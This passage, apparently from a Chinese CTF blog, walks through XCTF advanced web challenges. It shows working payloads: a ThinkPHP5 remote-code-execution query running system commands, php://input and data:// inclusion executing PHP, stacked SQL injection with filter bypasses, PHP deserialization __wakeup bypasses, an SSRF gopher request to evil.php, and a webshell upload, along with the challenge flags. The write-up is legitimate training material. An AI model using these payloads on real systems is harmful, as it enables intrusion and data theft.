<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.163.150&#x2F;test.php?url&#x3D;gopher:&#x2F;&#x2F;192.168.163.1:80&#x2F;_POST%20&#x2F;evil.php%20HTTP&#x2F;1.1%250d%250aHost:%20192.168.163.1%250d%250aUser-Agent:%20curl&#x2F;7.43.0%250d%250aAccept:%20*&#x2F;*%250d%250aContent-Type:%20application&#x2F;x-www-form-urlencoded%250d%250a%250d%250acmd&#x3D;balabala</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/20/CTF-Web-SSRF/" data-id="ckloj8nvk0000vcusd50p9nro" data-title="CTF-Web-SSRF" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-攻防世界web高级" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/20/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E7%BA%A7/" class="article-date">
  <time class="dt-published" datetime="2021-02-20T00:29:40.000Z" itemprop="datePublished">2021-02-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/20/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E7%BA%A7/">CTF-wp-攻防世界web高级</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h1><p>工具：firefox</p>
<p>看一下返回的响应头，就看到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;very_baby_web&#125;</span><br></pre></td></tr></table></figure>
<p>Training-WWW-Robots</p>
<p>打开网页，根据提示在url输入/robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;fl0g.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
<p>在url输入/fl0g.php，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;04a3b25a4981849593d0b45e6f3b2717&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h1><p>根据网页上显示的源码，需要在url的var中传入一个参数，这个参数首先会被base64解码，然后查看是否pre_match一个正则，最后被序列化</p>
<p>因此，需要把Demo中的file变量设置成“fl4g.php”，并且需要依次进行序列化，pre_match的绕过，base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private $file &#x3D; &#39;index.php&#39;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file &#x3D; $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123; </span><br><span class="line">            &#x2F;&#x2F;the secret is in the fl4g.php</span><br><span class="line">            $this-&gt;file &#x3D; &#39;index.php&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A &#x3D; new Demo(&#39;fl4g.php&#39;);</span><br><span class="line">    $C &#x3D; serialize($A);</span><br><span class="line">    &#x2F;&#x2F;string(49) &quot;O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span><br><span class="line">    $C &#x3D; str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$C);&#x2F;&#x2F;绕过preg_match</span><br><span class="line">    $C &#x3D; str_replace(&#39;:1:&#39;, &#39;:2:&#39;,$C);&#x2F;&#x2F;绕过wakeup</span><br><span class="line">    var_dump($C);</span><br><span class="line">    &#x2F;&#x2F;string(49) &quot;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span><br><span class="line">    var_dump(base64_encode($C));</span><br><span class="line">    &#x2F;&#x2F;string(68) &quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag&#x3D;&quot;ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;&quot;</span><br></pre></td></tr></table></figure>


<h2 id="php的var-dump"><a href="#php的var-dump" class="headerlink" title="php的var_dump"></a>php的var_dump</h2><p>输出变量信息</p>
<h2 id="php的class"><a href="#php的class" class="headerlink" title="php的class"></a>php的class</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__construct：初始化一个对象时执行</span><br><span class="line">__destruct：对象销毁时执行</span><br><span class="line">__wakeup：对象被反序列化时执行</span><br></pre></td></tr></table></figure>
<h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php rce"></a>php rce</h1><p>打开网页，先试试ThinkPHP V5的框架。在github上查找ThinkPHP V5的漏洞，存在以下语句可以获得shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
<p>依次执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls</span><br><span class="line">favicon.ico index.php robots.txt router.php static static</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;find &#x2F; -name &quot;flag&quot;</span><br><span class="line">&#x2F;flag &#x2F;flag</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;file &#x2F;flag</span><br><span class="line">&#x2F;flag: ASCII text &#x2F;flag: ASCII text</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cat &#x2F;flag</span><br><span class="line">flag&#123;thinkphp5_rce&#125; flag&#123;thinkphp5_rce&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>php据题目提示，将提供的字符串按base64解码得到答案</p>
<h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><p>考察：base64编码</p>
<p>根据题目提示，将提供的字符串按base64解码得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;Welcome_to_new_World!&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p>考察：php://input或data://</p>
<p><strong>方法1：大小写绕过or双写绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45427&#x2F;?hello&#x3D;echo &#96;ls&#96;&amp;page&#x3D;pHp:&#x2F;&#x2F;input</span><br><span class="line">Post data: &lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到当前目录下有一个flag</p>
<p><strong>方法2：data://伪协议</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45427&#x2F;?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>方法3：一句话木马+菜刀</strong></p>
<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><p>通过php访问输入输出流，后可接stdin,stdout,stderr。常用input和output代替，在post data部分传入php代码</p>
<h2 id="data-伪数据协议"><a href="#data-伪数据协议" class="headerlink" title="data://伪数据协议"></a>data://伪数据协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,&lt;?base64编码后的php代码?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php代码?&gt;</span><br></pre></td></tr></table></figure>


<h1 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h1><p>考察：堆叠注入，sql预编译</p>
<p>使用sqlmap失败，只能手工注入。</p>
<p>尝试后发现是单引号注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>使用union select，提示过滤了select等关键字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>使用原生sql函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;;show databases; --+</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;; show tables; --+</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;;</span><br></pre></td></tr></table></figure>
<p>使用sql变量和预编译技巧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;-&#39;;set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<p>提示使用函数绕过了prepare，此处用大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;-&#39;;set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);Prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<h2 id="sql的预编译"><a href="#sql的预编译" class="headerlink" title="sql的预编译"></a>sql的预编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 定义sql语句，如此定义可以绕过对select的过滤</span><br><span class="line">set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;)</span><br><span class="line">&#x2F;&#x2F; 定义预编译语句</span><br><span class="line">PREPARE stm FROM @sql;</span><br><span class="line">&#x2F;&#x2F; 执行预编译语句</span><br><span class="line">EXECUTE stm;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义带变量的预编译语句</span><br><span class="line">PREPARE stm FROM &#39;SELECT (?+?)&#39;</span><br><span class="line">&#x2F;&#x2F; 执行带变量的预编译语句</span><br><span class="line">EXECUTE stm USING @a, @b;</span><br></pre></td></tr></table></figure>
<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>打开页面，发现只能进入到一个页面中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:53522&#x2F;index.php?id&#x3D;1</span><br></pre></td></tr></table></figure>
<p>id处进行暴力枚举，得到2333为有响应的网页</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:53522&#x2F;index.php?id&#x3D;2333</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;967266c008c6e2bb3563346fef63b664&#125;</span><br></pre></td></tr></table></figure>


<h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>进入页面，只有一个滑稽。</p>
<p>查看源码，提示访问source.php，访问后得到一个php代码，该题为代码审计</p>
<p>以下为涉及到的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mb_substr(&amp;str, start, length) 返回[start,start+length]部分的str字符串</span><br><span class="line">in_array(&amp;t1, &amp;t2) 判断t1是否在数组t2中</span><br></pre></td></tr></table></figure>
<p>代码的主要功能在checkFile函数中，判断传入的参数file是否在whitelist中，若在则返回true，并include该file。由此可知，这是一个文件包含漏洞，绕过checkFile中的部分返回true即可</p>
<p>whilltelist中出了source.php，还有一个hint.php。</p>
<p>访问hint.php，提示flag在ffffllllaaaagggg中，目标文件尾ffffllllaaaagggg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:54846&#x2F;source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br><span class="line"># 目标文件在哪是多次测试得到的</span><br></pre></td></tr></table></figure>
<p>别人的wp提示，hint.php后的?会在上传时url解码，但是直接提交也过了2333</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25e7bce6005c4e0c983fb97297ac6e5a&#125;</span><br></pre></td></tr></table></figure>


<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><p>本题有个输入框</p>
<p>猜测为命令漏洞，失败</p>
<p>根据wp为sql注入</p>
<h2 id="sqlmap方法"><a href="#sqlmap方法" class="headerlink" title="sqlmap方法"></a>sqlmap方法</h2><p>抓包发现为post提交，因此需要将包存在在本地后，使用post发送发送</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r 1.txt --dbs 用1.txt内容去搜索对应的所有数据库名</span><br><span class="line">sqlmap.py -r 1.txt -D news --dump 建立可后台news库连接， 搜索所有的数据</span><br></pre></td></tr></table></figure>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>wp有手工注入方法，但是给我的环境莫名其妙试不了，加单引号就报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;sq1_inJec7ion_ezzz&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sqlmap的–dump选项"><a href="#sqlmap的–dump选项" class="headerlink" title="sqlmap的–dump选项"></a>sqlmap的–dump选项</h2><p>可以查询指定范围的全部数据</p>
<h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>下载附件，解压后得到一个文件，观察发现是混杂了普通字符和十六进制字符的html代码。</p>
<p>尝试手工替换，失败。</p>
<p>添加html后缀后，用浏览器打开，得到一个输入框，但是仍然不能得到解码后的js代码。</p>
<p>观察js源码，发现开头将_设置成了了整个函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; _&#x3D;&#39;function</span><br></pre></td></tr></table></figure>
<p>而结尾使用eval函数执行。那么将eval改成alert，即可得到完整的js代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function $()&#123;</span><br><span class="line">	var e&#x3D;document.getElementById(&quot;c&quot;).value;</span><br><span class="line">	if(e.length&#x3D;&#x3D;16)</span><br><span class="line">		if(e.match(&#x2F;^be0f23&#x2F;)!&#x3D;null)</span><br><span class="line">			if(e.match(&#x2F;233ac&#x2F;)!&#x3D;null)</span><br><span class="line">				if(e.match(&#x2F;e98aa$&#x2F;)!&#x3D;null)</span><br><span class="line">					if(e.match(&#x2F;c7be9&#x2F;)!&#x3D;null)&#123;</span><br><span class="line">						var t&#x3D;[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">						var n&#x3D;[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">						var r&#x3D;[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">						var i&#x3D;[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">						var s&#x3D;[t,n,r,i];</span><br><span class="line">						for(var o&#x3D;0;o&lt;13;++o)&#123;</span><br><span class="line">							document.write(s[o%4][0]);</span><br><span class="line">							s[o%4].splice(0,1)</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">							</span><br><span class="line">					document.write(&#39;&lt;input id&#x3D;&quot;c&quot;&gt;&lt;button onclick&#x3D;$()&gt;Ok&lt;&#x2F;button&gt;&#39;);delete _</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>可以通过在输入框输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beof233ac7be98aa</span><br></pre></td></tr></table></figure>
<p>得到flag，也可以通过审计代码直接获得flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;it&#39;s_a_h0le_in_0ne&#125;</span><br></pre></td></tr></table></figure>


<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>按照顺序一步步倒推操作</p>
<p>原密文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</span><br></pre></td></tr></table></figure>


<p>str_rot13</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</span><br></pre></td></tr></table></figure>
<p>strrev</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n</span><br></pre></td></tr></table></figure>
<p>base64_decode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~88:36e1bg8438e41757d:29cgeb6e48c&#96;GUDTO|;hbmg</span><br></pre></td></tr></table></figure>
<p>ascii码减1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure>
<p>strrev</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure>
<p>或者用python代码写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s0 &#x3D; &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span><br><span class="line">def rot13_decode(c):</span><br><span class="line">	if ord(c)&gt;&#x3D;ord(&#39;a&#39;) and ord(c)&lt;&#x3D;ord(&#39;z&#39;):</span><br><span class="line">		return chr((ord(c)-ord(&#39;a&#39;)+13) % 26 + ord(&#39;a&#39;))</span><br><span class="line">	elif ord(c)&gt;&#x3D;ord(&#39;A&#39;) and ord(c)&lt;&#x3D;ord(&#39;Z&#39;):</span><br><span class="line">		return chr((ord(c)-ord(&#39;A&#39;)+13) % 26 + ord(&#39;A&#39;))</span><br><span class="line">	else:</span><br><span class="line">		return c</span><br><span class="line"></span><br><span class="line">def decodeM(s0):</span><br><span class="line">	s1 &#x3D; &quot;&quot;</span><br><span class="line">	for s in s0:</span><br><span class="line">		s1 +&#x3D; rot13_decode(s)</span><br><span class="line">		# print(s1)</span><br><span class="line">	print(type(s1))</span><br><span class="line">	s1 &#x3D; s1[::-1] # 这里很关键</span><br><span class="line">	s1&#x3D;base64.b64decode(s1)</span><br><span class="line">	s1&#x3D;str(s1,&#39;utf-8&#39;) #这里很关键</span><br><span class="line">	s2&#x3D;&quot;&quot;</span><br><span class="line">	for s in s1:</span><br><span class="line">		s2 +&#x3D; chr(ord(s) - 1)</span><br><span class="line">	s2&#x3D;s2[::-1]</span><br><span class="line">	print(s2)</span><br><span class="line"></span><br><span class="line">decodeM(s0)</span><br></pre></td></tr></table></figure>
<p>日了刚开始密文用str定义，死活写不出来</p>
<p>也可以用php直接写，也比较方便。略过。</p>
<h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><p>使用御剑扫描，只有一个index.php</p>
<p>根据wp，访问phps，得到php源码</p>
<p>阅读源码，发现通过id传入admin即可</p>
<p>考虑到上传时自动操作urldecode一次，php源码中urlcode一次，则对admin进行两次urlencode加密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:42773&#x2F;index.php?id&#x3D;%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</span><br></pre></td></tr></table></figure>
<p>注意此处，id=admin而不是”admin”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;007cac75ed0e33c3a695f2e87b4da112&#125;</span><br></pre></td></tr></table></figure>
<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>访问地址，得到php源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag &#x3D; &#39;111&#39;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#39;bad requests&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?code&#x3D;</span><br></pre></td></tr></table></figure>
<p>根据题目名unserialize3和源码中出现的__wakeup函数，判断需要生成一个xctf的对象，然后将其序列化后赋值给code</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>根据wp，此处利用一个wakeup漏洞，即序列化字符串中属性个数大于真实属性个数时，会跳过wakeup的执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:47562&#x2F;index.php?code&#x3D;O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;e51c4424e28d385283c0deb1601cc47b&#125;</span><br></pre></td></tr></table></figure>
<h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h1><p>本题为文件上传</p>
<p>尝试上传一个php一句话木马，一选定文件，即弹框“请上传图片”。判断前端js做了后缀过滤，在firefox中把js禁掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">about:config</span><br><span class="line">搜索javascript:enabled，切换为false</span><br></pre></td></tr></table></figure>
<p>上传一个图片，发现会给出图片的地址。</p>
<p>尝试上传图片木马，失败。</p>
<p>直接上传php一句话木马，成功。使用菜刀链接后，可以找到flag.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;004bd6dd9c980a3ac47e680645f88133&#125;</span><br></pre></td></tr></table></figure>


<h1 id="web-python-template-injection"><a href="#web-python-template-injection" class="headerlink" title="web_python_template_injection"></a>web_python_template_injection</h1><p>题目提示是模板注入SSTI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;&#123;&#123;1+2&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>1+2执行了，存在SSTI。</p>
